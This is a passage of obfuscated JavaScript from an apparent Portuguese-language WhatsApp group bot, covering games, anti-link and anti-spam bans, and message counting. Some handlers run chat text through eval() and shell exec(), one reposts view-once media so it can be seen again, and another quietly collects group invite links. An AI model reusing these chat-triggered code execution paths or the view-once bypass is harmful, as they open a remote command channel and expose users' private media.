                    console.log(colors.brightCyan("\n╔┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╗\n║\n║ 〔 " + colors.brightBlue("USUÁRIO") + " 〕: 「 " + colors.brightBlue('' + _0x671b4b) + " 」\n║\n║ 〔 " + colors.brightMagenta("NÚMERO") + " 〕:「 " + colors.brightMagenta(_0x246d48.split('@')[0]) + " 」\n║\n║ 〔 " + colors.brightRed("GRUPO") + " 〕:「 " + colors.brightRed(_0x3baffe) + " 」\n║\n║ 〔 " + colors.brightGreen("COMANDO") + " 〕 :「 " + colors.brightGreen('' + _0x267d4b) + " 」\n║\n╚┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╝"));
                  } else {
                    console.log(colors.brightCyan("\n╔┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╗\n║\n║ 〔 " + colors.brightBlue("USUÁRIO") + " 〕: 「 " + colors.brightBlue('' + _0x671b4b) + " 」\n║\n║ 〔 " + colors.brightMagenta("NÚMERO") + " 〕:「 " + colors.brightMagenta(_0x246d48.split('@')[0]) + " 」\n║\n║ 〔 " + colors.brightRed("PRIVADO") + " 〕\n║\n╚┉✼┉═══════════༺◈✼" + _0x2cd689 + "✼◈༻═══════════┉✼┉╝"));
                  }
                }
              }
            }
          }
          async function _0x3ef012() {
            const _0xa7a2bb = _0x3a0a2c.toLowerCase().split(" ")[0] || '';
            let _0x593733 = ['1', '2', '3', '4', '5', '6', '7', '8', '9'];
            if (_0x3571af != false) {
              const _0x24732e = setGame('' + _0x346d97);
              if (_0x3a0a2c == "Cex") {
                return _0x50740b("why");
              }
              if (_0x3a0a2c.toLowerCase() == 's' || _0x3a0a2c.toLowerCase() == "sim" || _0x3a0a2c.toLowerCase() == 'ok') {
                if (_0x24732e.O == _0x246d48.replace("@s.whatsapp.net", '')) {
                  if (_0x24732e.status) {
                    return _0x50740b("O jogo já começou antes!");
                  }
                  const _0x197df2 = _0x24732e._matrix;
                  _0x24732e.status = true;
                  fs.writeFileSync("./armor/tictactoe/db/" + _0x346d97 + ".json", JSON.stringify(_0x24732e, null, 2));
                  const _0x132ec7 = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n                    \n❌ : @" + _0x24732e.X + "\n⭕ : @" + _0x24732e.O + "\n               \nSua vez... : @" + (_0x24732e.turn == 'X' ? _0x24732e.X : _0x24732e.O) + "\n\n" + _0x197df2[0][0] + "  " + _0x197df2[0][1] + "  " + _0x197df2[0][2] + "\n" + _0x197df2[1][0] + "  " + _0x197df2[1][1] + "  " + _0x197df2[1][2] + "\n" + _0x197df2[2][0] + "  " + _0x197df2[2][1] + "  " + _0x197df2[2][2] + "\n";
                  _0x5dcc57(_0x132ec7);
                }
              } else {
                if (_0x3a0a2c.toLowerCase() == 'n' || _0x3a0a2c.toLowerCase() == "não" || _0x3a0a2c.toLowerCase() == 'no') {
                  if (_0x24732e.O == _0x246d48.replace("@s.whatsapp.net", '')) {
                    if (_0x24732e.status) {
                      return _0x50740b("O jogo já começou!");
                    }
                    DLT_FL("./armor/tictactoe/db/" + _0x346d97 + ".json");
                    _0x5dcc57('@' + _0x24732e.X + " *_Infelizmente seu oponente não aceitou o desafio ❌😕_*");
                  }
                }
              }
            }
            if (_0x593733.includes(_0xa7a2bb)) {
              const _0x1eacab = setGame('' + _0x346d97);
              if (!_0x1eacab.status) {
                return _0x50740b("Parece que seu oponente não aceitou o desafio ainda...");
              }
              if ((_0x1eacab.turn == 'X' ? _0x1eacab.X : _0x1eacab.O) != _0x246d48.replace("@s.whatsapp.net", '')) {
                return;
              }
              const _0x1833fa = validmove(Number(_0x3a0a2c), '' + _0x346d97);
              const _0x4775f8 = _0x1833fa._matrix;
              if (_0x1833fa.isWin) {
                if (_0x1833fa.winner == "SERI") {
                  _0x50740b("*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n          \nJogo termina empatado 😐\n");
                  DLT_FL("./armor/tictactoe/db/" + _0x346d97 + ".json");
                  return;
                }
                const _0x5f2426 = _0x1833fa.winner == 'O' ? _0x1833fa.O : _0x1833fa.X;
                const _0x3979bf = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n          \nVencido por @" + _0x5f2426 + " 😎👑\n";
                _0x5dcc57(_0x3979bf);
                setTimeout(() => {
                  if (fs.existsSync("./armor/tictactoe/db/" + _0x346d97 + ".json")) {
                    DLT_FL("./armor/tictactoe/db/" + _0x346d97 + ".json");
                    _0x50740b("*🕹️JOGO DA VELHA RESETADO...🕹️*");
                  } else {
                    console.log(colors.red(time, "red"), colors.magenta("[ EXPIRADO ]"), colors.red("Jogo da velha espirado"));
                  }
                }, 300000);
                _0x50740b("_*🥳Parabéns @" + _0x5f2426 + " por ter ganhado o jogo da velha🎉...*_");
                DLT_FL("./armor/tictactoe/db/" + _0x346d97 + ".json");
              } else {
                const _0x263ebe = "*🎮Ꮐ̸Ꭺ̸Ꮇ̸Ꭼ̸ Ꭰ̸Ꭺ̸ Ꮩ̸Ꭼ̸Ꮮ̸Ꮋ̸Ꭺ̸🕹️*\n          \n❌ : @" + _0x1833fa.X + "\n⭕ : @" + _0x1833fa.O + "\n\nSua vez : @" + (_0x1833fa.turn == 'X' ? _0x1833fa.X : _0x1833fa.O) + "\n\n" + _0x4775f8[0][0] + "  " + _0x4775f8[0][1] + "  " + _0x4775f8[0][2] + "\n" + _0x4775f8[1][0] + "  " + _0x4775f8[1][1] + "  " + _0x4775f8[1][2] + "\n" + _0x4775f8[2][0] + "  " + _0x4775f8[2][1] + "  " + _0x4775f8[2][2] + "\n";
                _0x5dcc57(_0x263ebe);
              }
            }
          }
          function _0x5cf380(_0x1ad702, _0x562f52) {
            var _0x463cbb = 0;
            [..._0x1ad702].forEach(_0x62a59d => {
              if (_0x62a59d === _0x562f52) {
                _0x463cbb++;
              }
            });
            return _0x463cbb;
          }
          _0x3ef012();
          let _0x4e4363 = Array("tiktok", "facebook", "instagram", "twitter", "ytmp3", "ytmp4", "play", "play_audio", "play_video", "play").some(_0x5e78b6 => _0x5e78b6 === _0x267d4b);
          if (linkfy.find(_0x523298)[0]?.["isLink"] && _0x42a9f2 && !_0xd2050d.key.fromMe && !_0x3f2f63) {
            let _0xa4b2f = _0x523298.includes("chat.whatsapp.com/");
            let _0x140ead;
            if (_0xa4b2f) {
              try {
                _0x140ead = await _0x5196be?.["groupInviteCode"](_0x346d97);
              } catch {
                _0x140ead = "000000";
              }
            }
            if (_0xa4b2f && _0x140ead && _0x523298.match(_0x140ead) && _0x523298.split(" ").filter(_0x37a954 => _0x37a954 === "https://chat.whatsapp.com/").length < 2) {
              return _0x50740b("Link do nosso grupo, não irei remover.");
            }
            if (_0x3cafb4 && _0xa4b2f || _0x2b140d && !_0x4e4363) {
              let _0x88b2c3 = new Set(groupMembers.map(_0x37c7c8 => _0x37c7c8.id));
              if (_0x88b2c3.has(_0x246d48)) {
                let _0xd17ec0 = _0xa4b2f ? "advlinkgp" : "advlinkhard";
                if (!Array.isArray(_0x326cbd[0]?.[_0xd17ec0])) {
                  _0x326cbd[0][_0xd17ec0] = [];
                }
                if (_0x326cbd[0].advlink) {
                  let _0x48d1d0 = _0x326cbd[0][_0xd17ec0].find(_0x562553 => _0x562553.id === _0x246d48);
                  if (!_0x48d1d0) {
                    const _0x71e01d = {
                      id: _0x246d48,
                      adv: 0x1
                    };
                    _0x48d1d0 = _0x71e01d;
                    _0x326cbd[0][_0xd17ec0].push(_0x48d1d0);
                  } else {
                    if (!_0x48d1d0.adv) {
                      _0x48d1d0.adv = 1;
                    } else {
                      _0x48d1d0.adv += 1;
                    }
                  }
                  _0x137e44(_0x326cbd);
                  if (_0x48d1d0.adv >= 3) {
                    _0x326cbd[0][_0xd17ec0].splice(_0x326cbd[0][_0xd17ec0].findIndex(_0x30fc17 => _0x30fc17.id === _0x246d48), 1);
                    _0x137e44(_0x326cbd);
                    _0x50740b("Sinto muito usuário, você completou 3 advertências por enviar links, então removerei você.");
                    if (_0x1b869d) {
                      setTimeout(() => {
                        _0x5196be.sendMessage(_0x346d97, {
                          'delete': {
                            'remoteJid': _0x346d97,
                            'fromMe': false,
                            'id': _0xd2050d.key.id,
                            'participant': _0x246d48
                          }
                        });
                      }, 500);
                    }
                    return _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
                  } else {
                    _0x50740b("Usuário, você enviou um link e foi advertido em " + _0x48d1d0.adv + "/3. Não envie mais, pois pode acabar sendo removido.");
                    if (_0x1b869d) {
                      setTimeout(() => {
                        _0x5196be.sendMessage(_0x346d97, {
                          'delete': {
                            'remoteJid': _0x346d97,
                            'fromMe': false,
                            'id': _0xd2050d.key.id,
                            'participant': _0x246d48
                          }
                        });
                      }, 500);
                    }
                  }
                } else {
                  _0x5196be.groupSettingUpdate(_0x346d97, "announcement");
                  delay(100);
                  _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
                  delay(100);
                  function _0x183d78() {
                    let _0x5a672d = null;
                    if (!_0x5a672d) {
                      try {
                        _0x5a672d = fs.readFileSync("./DADOS/logos/ImgBan.jpg");
                      } catch (_0x3b1887) {
                        console.error("Erro ao carregar a imagem: " + _0x3b1887.message);
                        throw _0x3b1887;
                      }
                    }
                    return _0x5a672d;
                  }
                  let _0xcd2b04 = _0x183d78();
                  const _0x15c156 = {
                    text: "🚫 LINK DETECTADO, BANIDO 🚫",
                    contextInfo: {}
                  };
                  _0x15c156.contextInfo.externalAdReply = {};
                  _0x15c156.contextInfo.externalAdReply.title = "🚫 *LINK CENSEURADO* 🚫";
                  _0x15c156.contextInfo.externalAdReply.body = '';
                  _0x15c156.contextInfo.externalAdReply.previewType = "PHOTO";
                  _0x15c156.contextInfo.externalAdReply.thumbnail = _0xcd2b04;
                  _0x5196be.sendMessage(_0x346d97, _0x15c156);
                  setTimeout(() => {
                    _0x5196be.groupSettingUpdate(_0x346d97, "not_announcement");
                  }, 1500);
                  if (_0x1b869d) {
                    setTimeout(() => {
                      _0x5196be.sendMessage(_0x346d97, {
                        'delete': {
                          'remoteJid': _0x346d97,
                          'fromMe': false,
                          'id': _0xd2050d.key.id,
                          'participant': _0x246d48
                        }
                      });
                    }, 500);
                  }
                }
              }
            }
          }
          const _0x1a849c = [];
          for (let _0x195f5c of countMessage) {
            _0x1a849c.push(_0x195f5c.groupId);
          }
          var _0x114666 = [];
          if (_0x89cd51 && _0x1a849c.indexOf(_0x346d97) >= 0) {
            var _0x52a298 = _0x1a849c.indexOf(_0x346d97);
            for (let _0x12f5e2 of countMessage[_0x52a298].numbers) {
              _0x114666.push(_0x12f5e2.id);
            }
            if (_0x114666.indexOf(_0x246d48) >= 0) {
              var _0x4972e8 = _0x114666.indexOf(_0x246d48);
              var _0x1ab3c3 = countMessage[_0x52a298].numbers[_0x4972e8];
              if (_0x4c3ee0 == "stickerMessage") {
                '';
              } else {
                _0x1ab3c3.messages += _0x1d6d9e ? 0 : 1;
              }
              if (_0x4c3ee0 == "stickerMessage") {
                '';
              } else {
                _0x1ab3c3.cmd_messages += _0x1d6d9e ? 1 : 0;
              }
              if (_0x4c3ee0 == "stickerMessage") {
                '';
              } else {
                _0x1ab3c3.aparelho = _0x5f5cbb;
              }
              _0x1ab3c3.figus += _0x4c3ee0 == "stickerMessage" ? 1 : 0;
              fs.writeFileSync("./DADOS/grupos/countmsg.json", JSON.stringify(countMessage, null, 2) + "\n");
            } else {
              const _0x416008 = _0x1d6d9e ? 0 : 1;
              const _0x50d357 = _0x1d6d9e ? 1 : 0;
              var _0x1d40c2 = _0x4c3ee0 == "stickerMessage" ? 1 : 0;
              const _0x3c74cf = {
                id: _0x246d48,
                messages: _0x416008,
                cmd_messages: _0x50d357,
                aparelho: _0x5f5cbb,
                figus: _0x1d40c2
              };
              countMessage[_0x52a298].numbers.push(_0x3c74cf);
              fs.writeFileSync("./DADOS/grupos/countmsg.json", JSON.stringify(countMessage, null, 2) + "\n");
            }
          } else {
            if (_0x89cd51) {
              const _0xfb519e = {
                id: _0x246d48,
                messages: 0x2,
                figus: 0x0,
                cmd_messages: _0x1d6d9e ? 1 : 0,
                aparelho: _0x5f5cbb
              };
              const _0x49665f = {
                groupId: _0x346d97,
                numbers: [_0xfb519e]
              };
              countMessage.push(_0x49665f);
              fs.writeFileSync("./DADOS/grupos/countmsg.json", JSON.stringify(countMessage, null, 2) + "\n");
            }
          }
          if (_0x3a0a2c.startsWith('>')) {
            try {
              if (_0xd2050d.key.fromMe) {
                return;
              }
              if (!_0x3eefd0 && !issupre && !ischyt && !issupre && !ischyt) {
                return;
              }
              console.log('[', colors.cyan("EVAL"), ']', colors.yellow(moment(_0xd2050d.messageTimestamp * 1000).format("DD/MM HH:mm:ss")), colors.green(_0x3a0a2c));
              return _0x5196be.sendMessage(_0x346d97, {
                'text': JSON.stringify(eval(_0x3a0a2c.slice(2)), null, "\t")
              })["catch"](_0x2d86a2 => {
                return _0x50740b(String(_0x2d86a2));
              });
            } catch (_0x21910e) {
              return _0x50740b(String(_0x21910e));
            }
          }
          if (_0x3a0a2c.startsWith('(>')) {
            try {
              if (_0xd2050d.key.fromMe) {
                return;
              }
              if (!_0x3eefd0 && !issupre && !ischyt && !issupre && !ischyt) {
                return;
              }
              var _0x24837f = _0x3a0a2c.slice(3);
              Return = _0x1e4abd => {
                var _0x382682 = JSON.stringify(_0x1e4abd, null, 2);
                bang = util.format(_0x382682);
                if (_0x382682 == undefined) {
                  bang = util.format(_0x1e4abd);
                }
                const _0x48b962 = {
                  text: bang
                };
                const _0x505b71 = {
                  quoted: _0xd2050d
                };
                return _0x5196be.sendMessage(_0x346d97, _0x48b962, _0x505b71);
              };
              _0x5196be.sendMessage(_0x346d97, {
                'text': util.format(eval(";(async () => { " + _0x24837f + " })()"))
              })["catch"](_0x4f755 => {
                return _0x50740b(String(_0x4f755));
              });
              console.log("[1;37m>", '[', "[1;32mEXEC[1;37m", ']', time, colors.green('>'), "from", colors.green(_0x246d48.split('@')[0]), "args :", colors.green(_0x23d865.length));
            } catch (_0x1c43c5) {
              return _0x50740b(String(_0x1c43c5));
              console.log(_0x1c43c5);
            }
          }
          if (_0x3ac611.startsWith('$')) {
            if (_0xd2050d.key.fromMe) {
              return;
            }
            if (!_0x3eefd0) {
              return;
            }
            exec(_0x11e99e, (_0x241024, _0x186006) => {
              if (_0x241024) {
                return _0x50740b('' + _0x241024);
              }
              if (_0x186006) {
                _0x50740b(_0x186006);
              }
            });
          }
          if (_0x2ddc0a && !_0x3f2f63 && _0x42a9f2 && _0x4c3ee0 == "imageMessage") {
            if (_0xd2050d.key.fromMe) {
              return;
            }
            if (_0x326cbd[0].legenda_imagem != '0') {
              const _0x5e9593 = {
                text: _0x326cbd[0].legenda_imagem
              };
              const _0x472319 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x5e9593, _0x472319);
            }
            if (_0x1b869d) {
              setTimeout(() => {
                _0x5196be.sendMessage(_0x346d97, {
                  'delete': {
                    'remoteJid': _0x346d97,
                    'fromMe': false,
                    'id': _0xd2050d.key.id,
                    'participant': _0x246d48
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
              return;
            }
            _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
          }
          if (_0x1a72a5 && !_0x3f2f63 && _0x42a9f2 && _0x4c3ee0 == "stickerMessage") {
            if (_0xd2050d.key.fromMe) {
              return;
            }
            const _0xb469a4 = {
              text: "*mensagem proibida detectada, banindo...*"
            };
            const _0x15533a = {
              quoted: _0xd2050d
            };
            _0x5196be.sendMessage(_0x346d97, _0xb469a4, _0x15533a);
            if (_0x1b869d) {
              setTimeout(() => {
                _0x5196be.sendMessage(_0x346d97, {
                  'delete': {
                    'remoteJid': _0x346d97,
                    'fromMe': false,
                    'id': _0xd2050d.key.id,
                    'participant': _0x246d48
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
              return;
            }
            _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
          }
          if (_0x5aaef2 && _0x42a9f2 && !_0x3f2f63 && _0x4c3ee0 == "documentMessage") {
            if (_0xd2050d.key.fromMe) {
              return;
            }
            if (_0x326cbd[0].legenda_documento != '0') {
              const _0x5d0374 = {
                text: _0x326cbd[0].legenda_documento
              };
              const _0x41bef1 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x5d0374, _0x41bef1);
            }
            if (_0x1b869d) {
              setTimeout(() => {
                _0x5196be.sendMessage(_0x346d97, {
                  'delete': {
                    'remoteJid': _0x346d97,
                    'fromMe': false,
                    'id': _0xd2050d.key.id,
                    'participant': _0x246d48
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
              return;
            }
            _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
          }
          if (_0x89cd51 && _0x48bcb9 && !_0x1d6d9e && !_0xd2050d.key.fromMe && !_0xf59944 && !_0x3f2f63 && !_0x4c3ee0 == "protocolMessage" && !_0xd2050d.message?.["reactionMessage"]?.["text"]) {
            async function _0x5f349f() {
              if (antispam.map(_0x48e3d4 => _0x48e3d4.id).indexOf(_0x246d48) >= 0) {
                position = antispam.map(_0x375c59 => _0x375c59.id).indexOf(_0x246d48);
                if (antispam[position].active && Date.now() < antispam[position].time) {
                  _0x326cbd[0].advertir2.push(_0x246d48);
                  _0x137e44(_0x326cbd);
                  var _0xa9679d = _0x326cbd[0].advertir2.filter(_0x18fad9 => _0x18fad9 == _0x246d48).length;
                  var _0x212ccc = _0xa9679d + '/3';
                  var _0x67a97f = "Opa: @" + _0x246d48.split('@')[0] + " você foi advertido " + (_0xa9679d == 2 ? 1 : 2) + "/2, tome cuidado, com 2 advertências, você será removido, para de spamar mensagem ae...";
                  if (!_0x212ccc.includes("3/3")) {
                    if (!JSON.stringify(_0x326cbd[0].advertir2).includes(_0x246d48)) {
                      await sleep(1500);
                      _0x1106fd(_0x67a97f, [_0x246d48]);
                    } else if (_0xa9679d == 2) {
                      await sleep(1500);
                      _0x1106fd(_0x67a97f, [_0x246d48]);
                      setTimeout(async () => {
                        var _0x2622d9 = _0x326cbd[0].advertir2.indexOf(_0x246d48);
                        _0x326cbd[0].advertir2.splice(_0x2622d9, 2);
                        _0x137e44(_0x326cbd);
                      }, 45000);
                    }
                  } else {
                    _0x5196be.sendMessage(_0x346d97, {
                      'text': "Adeus usuário @" + _0x246d48.split('@')[0] + ", você completou 2 advertências 😪, você tá se comportando feito criança e flodando mensagens..",
                      'mentions': [_0x246d48]
                    });
                    setTimeout(() => {
                      _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
                    }, 500);
                    setTimeout(async () => {
                      var _0x2f252c = _0x326cbd[0].advertir2.indexOf(_0x246d48);
                      _0x326cbd[0].advertir2.splice(_0x2f252c, 3);
                      _0x137e44(_0x326cbd);
                    }, 1500);
                  }
                }
                if (Date.now() > antispam[position].time && antispam[position].active) {
                  antispam[position].active = false;
                }
                if (Date.now() > antispam[position].time) {
                  return antispam[position].time = Date.now() + _0x26fdfe('1s');
                }
                if (!antispam[position].active && Date.now() < antispam[position].time) {
                  antispam[position].active = true;
                }
                fs.writeFileSync("./DADOS/json/antispam.json", JSON.stringify(antispam));
              } else {
                antispam.push({
                  'id': _0x246d48,
                  'time': Date.now() + _0x26fdfe('1s'),
                  'active': false
                });
                fs.writeFileSync("./DADOS/json/antispam.json", JSON.stringify(antispam));
              }
            }
            _0x5f349f();
          }
          if (_0x51d731 && _0x5725b4.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi) && _0x42a9f2 && !_0x3f2f63 && !_0xf59944 && !_0xd2050d.message?.["reactionMessage"]?.["text"] && _0x5725b4.length > 20) {
            let _0x20fddb = _0x5725b4.toString().match(/(💳|💎|💸|💵|💷|💶|🪙|💰|🤑|⚖️)/gi);
            if (_0x20fddb && _0x3a0a2c.length < 100) {
              return;
            }
            if (_0x1b869d) {
              setTimeout(() => {
                _0x5196be.sendMessage(_0x346d97, {
                  'delete': {
                    'remoteJid': _0x346d97,
                    'fromMe': false,
                    'id': _0xd2050d.key.id,
                    'participant': _0x246d48
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
              return;
            }
            _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
          }
          if (_0x14171f && _0x42a9f2 && !_0x3f2f63 && _0x4c3ee0 == "videoMessage") {
            if (_0x326cbd[0].legenda_video == '0') {
              const _0x26bfd7 = {
                text: "*mensagem proibida detectada, banindo...*"
              };
              const _0x4e7041 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x26bfd7, _0x4e7041);
            } else {
              const _0x772c6b = {
                text: _0x326cbd[0].legenda_video
              };
              const _0x2e2409 = {
                quoted: _0xd2050d
              };
              _0x5196be.sendMessage(_0x346d97, _0x772c6b, _0x2e2409);
            }
            if (_0x1b869d) {
              setTimeout(() => {
                _0x5196be.sendMessage(_0x346d97, {
                  'delete': {
                    'remoteJid': _0x346d97,
                    'fromMe': false,
                    'id': _0xd2050d.key.id,
                    'participant': _0x246d48
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
              return;
            }
            _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
          }
          if (_0x1b617c && _0x42a9f2 && !_0x3f2f63 && _0x4c3ee0 == "audioMessage") {
            const _0x218f88 = {
              text: "*mensagem proibida detectada, banindo...*"
            };
            const _0x5d13a8 = {
              quoted: _0xd2050d
            };
            _0x5196be.sendMessage(_0x346d97, _0x218f88, _0x5d13a8);
            if (_0x1b869d) {
              setTimeout(() => {
                _0x5196be.sendMessage(_0x346d97, {
                  'delete': {
                    'remoteJid': _0x346d97,
                    'fromMe': false,
                    'id': _0xd2050d.key.id,
                    'participant': _0x246d48
                  }
                });
              }, 500);
            }
            if (!JSON.stringify(groupMembers).includes(_0x246d48)) {
              return;
            }
            _0x5196be.groupParticipantsUpdate(_0x346d97, [_0x246d48], "remove");
          }
          {
            var _0x1d96d7 = moment.tz("America/Sao_Paulo").format("HH:mm");
            var _0x42d8cc = moment.tz("America/Sao_Paulo").format('mm');
            for (_0x3194f3 of black_) {
              if (_0x3194f3.hora == _0x1d96d7) {
                var _0x491347 = true;
              } else {
                var _0x491347 = false;
              }
            }
            if (_0x491347 == true) {
              for (_0x3194f3 of black_) {
                if (_0x3194f3.hora == _0x1d96d7) {
                  var _0x4d06ee = _0x3194f3;
                }
              }
              for (_0x3194f3 of _0x4d06ee?.["PUXAR"]) {
                if (_0x3194f3.avisou == true) {
                  return;
                }
                if (_0x3194f3.length == 0) {
                  return;
                }
                _0x5196be.sendMessage(_0x3194f3.idgp, {
                  'text': _0x3194f3.msg
                });
                _0x3194f3.avisou = true;
                fs.writeFileSync("./DADOS/datab/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
              }
            }
            ;
            for (_0x3194f3 of black_) {
              if (_0x42d8cc >= parseInt(_0x3194f3.hora.split(':')[1]) + 1) {
                var _0x5314af = _0x3194f3;
                var _0xdb5159 = true;
              } else {
                var _0xdb5159 = false;
              }
            }
            ;
            if (_0xdb5159 == true) {
              for (_0x3194f3 of _0x5314af.PUXAR) {
                if (_0x3194f3.avisou == true) {
                  _0x3194f3.avisou = false;
                  fs.writeFileSync("./DADOS/datab/grupos/AVISOS.json", JSON.stringify(black_, null, 2));
                }
              }
            }
          }
          var _0x1c1117 = [];
          msgantipvv = msgantipv1.replace("#numerodono#", setting.numerodono);
          if (_0x2d6efa && !_0x1c1117.includes(_0x246d48)) {
            if (!_0x89cd51 && !_0xf59944 && !_0x3eefd0 && !_0x33286a) {
              await sleep(2500);
              _0x50740b(msgantipvv);
              setTimeout(async () => {
                _0x5196be.updateBlockStatus(_0x246d48, "block");
              }, 2000);
              return;
            }
            _0x1c1117.push(_0x246d48);
          }
          var _0x679cd2 = [];
          msgantipvv2 = msgantipv2.replace("#numerodono#", setting.numerodono);
          if (!_0x89cd51 && !_0x33286a && !_0xf59944 && !_0x3eefd0 && !issupre && !ischyt && !_0xd2050d.key.fromMe && _0x675276 && !_0x679cd2.includes(_0x246d48)) {
            _0x679cd2.push(_0x246d48);
            return _0x50740b(msgantipvv2);
          }
          if (!_0x89cd51 && !_0x33286a && !_0x3eefd0 && !_0xf59944 && !_0xd2050d.key.fromMe && _0x36e704) {
            return;
          }
          var _0x985c7 = [];
          if (!_0x89cd51 && _0x50be44 && !_0x985c7.includes(_0x246d48)) {
            _0x5196be.ws.on("CB:call", async _0x3813e7 => {
              if (_0x3813e7.content[0].tag == "offer") {
                _0x5196be.sendMessage(_0x3813e7.content[0].attrs["call-creator"], {
                  'text': "_- PROGRAMAÇÃO DE - _\n\n BLOQUEAR / USUARIOS POR EFETUAR LIGAÇÃO PARA O BOT\n\n_- REALIZANDO AÇÃO _-"
                }).then(() => {
                  _0x5196be.updateBlockStatus(_0x3813e7.content[0].attrs["call-creator"], "block");
                });
              }
            });
            _0x985c7.push(_0x246d48);
          }
          var _0x3037a3 = countMessage.map(_0x31ea82 => _0x31ea82.groupId).indexOf(_0x346d97);
          var _0x462c63 = _0x1a849c.indexOf(_0x346d97);
          var _0x3bd884 = _0x114666?.["indexOf"](_0x246d48);
          if (_0xc01de) {
            if (_0xd2050d.message?.["viewOnceMessageV2"] || _0xd2050d.message?.["viewOnceMessageV2Extension"]?.["message"]?.["audioMessage"] || _0x4c3ee0 == "viewOnceMessage") {
              if (JSON.stringify(_0xd2050d).includes("audioMessage")) {
                var _0x413a87 = _0xd2050d.message?.["viewOnceMessageV2Extension"]?.["message"]?.["audioMessage"];
                _0x413a87.viewOnce = false;
                _0x413a87.audio = {
                  'url': _0x413a87.url
                };
                _0x5196be.sendMessage(_0x346d97, _0x413a87);
              } else {
                if (JSON.stringify(_0xd2050d).includes("videoMessage")) {
                  var _0x413a87 = _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["videoMessage"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["videoMessage"];
                  _0x413a87.viewOnce = false;
                  _0x413a87.video = {
                    'url': _0x413a87.url
                  };
                  _0x413a87.caption += "\n\nRevelando Visualização única..";
                  _0x5196be.sendMessage(_0x346d97, _0x413a87);
                } else {
                  var _0x413a87 = _0xd2050d.message?.["viewOnceMessageV2"]?.["message"]?.["imageMessage"] || _0xd2050d.message?.["viewOnceMessage"]?.["message"]?.["imageMessage"];
                  _0x413a87.viewOnce = false;
                  _0x413a87.image = {
                    'url': _0x413a87.url
                  };
                  _0x413a87.caption += "\n\nRevelando Visualização única..";
                  _0x5196be.sendMessage(_0x346d97, _0x413a87);
                }
              }
            }
          }
          if (_0x4b84b4) {
            return BannedExpired(ban);
          }
          var _0x36b9db = JSON.parse(fs.readFileSync("./DADOS/datab/grupos/palavras_forca.json"));
          var _0x24a135 = _0x36b9db[Math.floor(Math.random() * _0x36b9db.length)];
          var _0x2304a7 = _0x24a135?.["plvr"]["toLowerCase"]()["normalize"]("NFD")["replace"](/[\u0300-\u036f]/g, '');
          async function _0x4b4b15() {
            var _0x20e12f = [];
            for (var _0x3cae95 = 0; _0x3cae95 < _0x2304a7.length; _0x3cae95++) {
              if (_0x2304a7[_0x3cae95] == " ") {
                _0x20e12f.push(" ");
              } else {
                _0x20e12f.push('_');
              }
            }
            const _0x25a5ff = {
              acertos: 0x0,
              erros: 0x0,
              palavra: _0x20e12f,
              escreveu: [],
              palavra_ofc: _0x2304a7,
              dica: _0x24a135.dica,
              tema: _0x24a135.tema
            };
            _0x326cbd[0].forca_ofc = [_0x25a5ff];
            _0x326cbd[0].forca_inc = false;
            _0x137e44(_0x326cbd);
          }
          if (_0x89cd51 && isRecolherLink && _0x3a0a2c.includes("https://chat.whatsapp.com")) {
            for (var _0x3194f3 = 1; _0x3194f3 < _0x3ac611.split("https://chat.whatsapp.com/").length; _0x3194f3++) {
              if (!JSON.stringify(recolherLNK.map(_0x565141 => _0x565141.Link)).includes("https://chat.whatsapp.com/" + _0x3ac611.split("https://chat.whatsapp.com/")[_0x3194f3].slice(0, 22))) {
                recolherLNK.push({
                  'Link': "https://chat.whatsapp.com/" + _0x3ac611.split("https://chat.whatsapp.com/")[_0x3194f3].slice(0, 22)
                });
              }
            }
            fs.writeFileSync("./DADOS/json/recolherLNK.json", JSON.stringify(recolherLNK, null, 2));
          }
          if (!_0x33286a && nescessario.cmdpremium.includes(_0x267d4b)) {
            return _0x50740b("Este comando é apenas para\nusuário premium, se deseja adquirir, fale com meu dono:\nhttps://wa.me/" + numerodono_ofc);
          }
          if (!JSON.stringify(_0xd2050d).includes("reactionMessage") && !JSON.stringify(_0xd2050d).includes("ReactionMessage")) {
            var _0x3037a3 = countMessage.map(_0x405291 => _0x405291.groupId).indexOf(_0x346d97);
            var _0x462c63 = _0x1a849c.indexOf(_0x346d97);
            var _0x3bd884 = _0x114666.indexOf(_0x246d48);
            if (_0x89cd51 && JSON.stringify(countMessage).includes(_0x346d97) && JSON.stringify(countMessage[_0x3037a3]).includes(_0x246d48)) {
              try {
